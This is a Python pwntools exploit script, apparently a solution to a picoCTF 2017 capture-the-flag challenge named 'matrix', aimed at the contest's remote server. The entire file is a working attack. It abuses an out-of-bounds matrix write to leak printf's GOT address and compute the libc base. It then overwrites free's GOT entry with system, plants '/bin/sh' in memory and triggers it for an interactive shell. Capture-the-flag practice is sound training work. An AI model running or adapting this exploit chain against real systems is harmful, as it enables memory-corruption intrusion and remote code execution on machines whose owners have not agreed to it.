from pwn import *
import struct

prog = ['./matrix']

GOT_PRINTF = 0x0804a108
GOT_FREE   = 0x0804a10c
OFF_PRINTF = 0x00053260
OFF_SYSTEM = 0x0003e8f0

OFF_PRINTF = 0x0004cc70
OFF_SYSTEM = 0x0003e3e0

# p = process(argv=prog, executable=prog[0])
p = remote('shell2017.picoctf.com', 37838)

def to_int(floating):
    return struct.unpack('I', struct.pack("f", floating))[0]

def to_float(val):
    return struct.unpack('f', struct.pack('I', val))[0]

# GDB = """
# watch (int *) *0x804a108
# c
# """
# gdb.attach(p, GDB)

p.sendline(b'create 6 5')
p.sendline(b'create 1 1')
p.sendline(b'create 1 2')
p.sendline(b'set 0 5 4 {}'.format(to_float(GOT_PRINTF)))
p.sendline(b'get 1 0 0')

p.recvuntil('Matrix[0][0] = ')
d = p.recvuntil('\n')
pritf_addr = to_int(float(d))

info("printf: " + hex(pritf_addr))

base = pritf_addr - OFF_PRINTF
system_addr = base + OFF_SYSTEM

p.sendline(b'set 0 5 4 {}'.format(to_float(GOT_FREE)))
p.recvline()
p.sendline(b'set 1 0 0 {}'.format(to_float(system_addr)))
p.recvline()

p.sendline(b'set 2 0 0 {}'.format(to_float(0x6e69622f)))
p.recvline()
p.sendline(b'set 2 0 1 {}'.format(to_float(0x0068732f)))
p.recvline()

_GDB = """
x/32xw 0x804a180
x/64xw *0x804a188
b*0x8048c21
"""
#gdb.attach(p, _GDB)

p.sendline('destroy 2')
p.recvuntil('Enter command: ')
info("Enjoy your shell :)")
p.interactive()
